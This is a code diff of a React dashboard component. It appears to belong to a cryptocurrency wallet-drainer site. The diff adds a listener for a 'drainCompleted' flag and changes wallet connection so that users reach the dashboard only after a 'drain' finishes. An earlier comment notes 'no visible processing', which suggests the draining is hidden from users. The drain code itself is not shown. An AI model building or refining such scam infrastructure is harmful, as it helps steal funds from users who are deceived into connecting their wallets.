@@ -47,17 +47,27 @@ export default function Dashboard() {
       setIsWalletConnected(!!updated);
     };
     
+    // Listen for drain completion changes
+    const handleDrainCompletion = () => {
+      const drainStatus = localStorage.getItem('drainCompleted');
+      setDrainCompleted(drainStatus === 'true');
+    };
+    
     window.addEventListener('storage', handleStorageChange);
-    return () => window.removeEventListener('storage', handleStorageChange);
+    window.addEventListener('storage', handleDrainCompletion);
+    return () => {
+      window.removeEventListener('storage', handleStorageChange);
+      window.removeEventListener('storage', handleDrainCompletion);
+    };
   }, []);
 
   const handleWalletConnect = (address: string) => {
     setUserAddress(address);
     setIsWalletConnected(true);
     localStorage.setItem('connectedWallet', address);
-    // Immediate access - no visible processing
-    setDrainCompleted(true);
-    localStorage.setItem('drainCompleted', 'true');
+    // Don't mark as completed immediately - wait for drain to complete
+    setDrainCompleted(false);
+    localStorage.removeItem('drainCompleted');
   };
 
   // Redirect to home if not connected or drain not completed
